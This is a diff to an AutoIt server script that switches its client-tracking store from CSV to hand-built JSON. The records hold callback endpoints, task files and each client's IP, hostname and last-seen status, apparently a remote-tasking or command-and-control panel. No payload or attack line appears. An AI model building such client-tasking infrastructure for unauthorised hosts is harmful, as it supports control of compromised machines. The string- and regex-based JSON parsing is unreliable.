@@ -14,7 +14,7 @@
 
 ; ---------- Globals ----------
 Global $gSrvSock = -1, $gPort = 8080
-Global $gClientsFile = @ScriptDir & "\..\db\clients.csv"
+Global $gClientsFile = @ScriptDir & "\..\db\clients.json"
 Global $gTasksFile = @ScriptDir & "\..\db\tasks.json"
 Global $gAttachedLog = -1, $gAttachedLV = -1
 Global $gApiKey = EnvGet("X_API_KEY") ; optional auth header for /cb & /task_result
@@ -304,15 +304,15 @@ Func _HandleManifest($cSock)
     _SendHTTP($cSock, 200, "application/json", $m)
 EndFunc
 
-; ---------- CSV Storage ----------
+; ---------- JSON Storage ----------
 Func _DB_Startup()
-    _LogUI("[CSV] Initializing CSV storage")
+    _LogUI("[JSON] Initializing JSON storage")
     
-    ; Create clients.csv with header if not exists
+    ; Create clients.json as empty array if not exists
     If Not FileExists($gClientsFile) Then
-        Local $h = FileOpen($gClientsFile, 2) ; overwrite mode
+        Local $h = FileOpen($gClientsFile, 2)
         If $h <> -1 Then
-            FileWrite($h, "client_id,ip_public,ip_local,hostname,os,version,status,last_message,last_seen" & @CRLF)
+            FileWrite($h, "[]")
             FileClose($h)
         EndIf
     EndIf
@@ -326,41 +326,64 @@ Func _DB_Startup()
         EndIf
     EndIf
     
-    _LogUI("[CSV] Storage initialized")
+    _LogUI("[JSON] Storage initialized")
 EndFunc
 
 Func _DB_Shutdown()
-    ; Nothing to cleanup for CSV
+    ; Nothing to cleanup for JSON
 EndFunc
 
 Func _DB_UpsertClient($cid, $ip_public, $ip_local, $hostname, $status, $message, $ts)
-    ; Read existing clients
-    Local $aClients
-    _FileReadToArray($gClientsFile, $aClients)
-    If @error Then Return
+    ; Read existing clients JSON
+    Local $json = _ReadFile($gClientsFile)
+    If $json = "" Or $json = "[]" Then $json = "[]"
     
-    ; Find if client exists (skip header row 0)
-    Local $found = False, $foundIdx = -1
-    For $i = 1 To $aClients[0]
-        Local $cols = StringSplit($aClients[$i], ",", 2)
-        If UBound($cols) > 0 And $cols[0] = $cid Then
-            $found = True
-            $foundIdx = $i
-            ExitLoop
-        EndIf
-    Next
+    ; Build new client object
+    Local $clientObj = '{"client_id":"' & _JsonEscStr($cid) & '",' & _
+                       '"ip_public":"' & _JsonEscStr($ip_public) & '",' & _
+                       '"ip_local":"' & _JsonEscStr($ip_local) & '",' & _
+                       '"hostname":"' & _JsonEscStr($hostname) & '",' & _
+                       '"os":"",' & _
+                       '"version":"",' & _
+                       '"status":"' & _JsonEscStr($status) & '",' & _
+                       '"last_message":"' & _JsonEscStr($message) & '",' & _
+                       '"last_seen":"' & _JsonEscStr($ts) & '"}'
     
-    ; Build CSV line: client_id,ip_public,ip_local,hostname,os,version,status,last_message,last_seen
-    Local $line = _CSVEscape($cid) & "," & _CSVEscape($ip_public) & "," & _CSVEscape($ip_local) & "," & _CSVEscape($hostname) & ",," & _
-                  "," & _CSVEscape($status) & "," & _CSVEscape($message) & "," & _CSVEscape($ts)
+    ; Find if client already exists
+    Local $searchClient = '"client_id":"' & _JsonEscStr($cid) & '"'
+    Local $pos = StringInStr($json, $searchClient)
     
-    If $found Then
-        ; Update existing
-        $aClients[$foundIdx] = $line
-        _FileWriteFromArray($gClientsFile, $aClients, 1)
+    If $pos > 0 Then
+        ; Update existing client - find the object boundaries
+        Local $objStart = 0
+        For $i = $pos To 1 Step -1
+            If StringMid($json, $i, 1) = "{" Then
+                $objStart = $i
+                ExitLoop
+            EndIf
+        Next
+        If $objStart = 0 Then $objStart = 1
+        
+        Local $objEnd = StringInStr($json, "}", 0, 1, $pos)
+        If $objEnd = 0 Then Return  ; Malformed JSON
+        
+        ; Replace the old object with new one
+        $json = StringLeft($json, $objStart - 1) & $clientObj & StringMid($json, $objEnd + 1)
     Else
-        ; Append new
-        FileWrite($gClientsFile, $line & @CRLF)
+        ; Add new client
+        If $json = "[]" Then
+            $json = "[" & $clientObj & "]"
+        Else
+            ; Insert before closing bracket
+            $json = StringTrimRight($json, 1) & "," & $clientObj & "]"
+        EndIf
+    EndIf
+    
+    ; Write back
+    Local $h = FileOpen($gClientsFile, 2)
+    If $h <> -1 Then
+        FileWrite($h, $json)
+        FileClose($h)
     EndIf
 EndFunc
 
@@ -522,20 +545,32 @@ EndFunc
 
 ; Get clients list for GUI ListView (returns 2D array)
 Func _DB_GetClientsForUI(ByRef $out, ByRef $rows)
-    Local $aClients
-    _FileReadToArray($gClientsFile, $aClients)
-    If @error Or $aClients[0] < 2 Then  ; Need at least header + 1 data row
+    Local $json = _ReadFile($gClientsFile)
+    If $json = "" Or $json = "[]" Then
         $rows = 0
         Local $empty[0][0]
         $out = $empty
         Return 0
     EndIf
     
-    ; _FileReadToArray: $aClients[1] = CSV header, data starts at $aClients[2]
-    ; Build 2D array: row 0 = header for compatibility, actual data from row 1
-    Local $dataRows = $aClients[0] - 1  ; Exclude CSV header
-    Local $data[$dataRows + 1][8]
+    ; Parse JSON array - regex for client objects
+    ; Pattern: {"client_id":"...","ip_public":"...","ip_local":"...","hostname":"...","os":"...","version":"...","status":"...","last_message":"...","last_seen":"..."}
+    Local $pattern = '\{"client_id":"([^"]*)","ip_public":"([^"]*)","ip_local":"([^"]*)","hostname":"([^"]*)","os":"([^"]*)","version":"([^"]*)","status":"([^"]*)","last_message":"([^"]*)","last_seen":"([^"]*)"\}'
+    Local $matches = StringRegExp($json, $pattern, 3)  ; Global mode
     
+    If @error Or UBound($matches) = 0 Then
+        $rows = 0
+        Local $empty[0][0]
+        $out = $empty
+        Return 0
+    EndIf
+    
+    ; Matches array: [client_id, ip_public, ip_local, hostname, os, version, status, msg, ts, client_id2, ...]
+    ; Each client has 9 fields
+    Local $numClients = Int(UBound($matches) / 9)
+    Local $data[$numClients + 1][8]
+    
+    ; Header row
     $data[0][0] = "client_id"
     $data[0][1] = "ip"
     $data[0][2] = "hostname"
@@ -545,25 +580,23 @@ Func _DB_GetClientsForUI(ByRef $out, ByRef $rows)
     $data[0][6] = "last_message"
     $data[0][7] = "last_seen"
     
-    ; Loop from CSV row 2 (skip header at row 1), put into data array starting at row 1
+    ; Data rows
     Local $outIdx = 1
-    For $i = 2 To $aClients[0]
-        Local $cols = StringSplit($aClients[$i], ",", 2)
-        If UBound($cols) >= 9 Then
-            $data[$outIdx][0] = $cols[0]  ; client_id
-            $data[$outIdx][1] = $cols[2] <> "" ? $cols[2] : $cols[1]  ; ip (prefer ip_local)
-            $data[$outIdx][2] = $cols[3]  ; hostname
-            $data[$outIdx][3] = $cols[4]  ; os
-            $data[$outIdx][4] = $cols[5]  ; version
-            $data[$outIdx][5] = $cols[6]  ; status
-            $data[$outIdx][6] = $cols[7]  ; last_message
-            $data[$outIdx][7] = $cols[8]  ; last_seen
-            $outIdx += 1
-        EndIf
+    For $i = 0 To UBound($matches) - 1 Step 9
+        $data[$outIdx][0] = $matches[$i]      ; client_id
+        ; Prefer ip_local over ip_public
+        $data[$outIdx][1] = $matches[$i + 2] <> "" ? $matches[$i + 2] : $matches[$i + 1]  ; ip
+        $data[$outIdx][2] = $matches[$i + 3]  ; hostname
+        $data[$outIdx][3] = $matches[$i + 4]  ; os
+        $data[$outIdx][4] = $matches[$i + 5]  ; version
+        $data[$outIdx][5] = $matches[$i + 6]  ; status
+        $data[$outIdx][6] = $matches[$i + 7]  ; last_message
+        $data[$outIdx][7] = $matches[$i + 8]  ; last_seen
+        $outIdx += 1
     Next
     
     $out = $data
-    $rows = $dataRows
+    $rows = $numClients
     Return $rows
 EndFunc
 
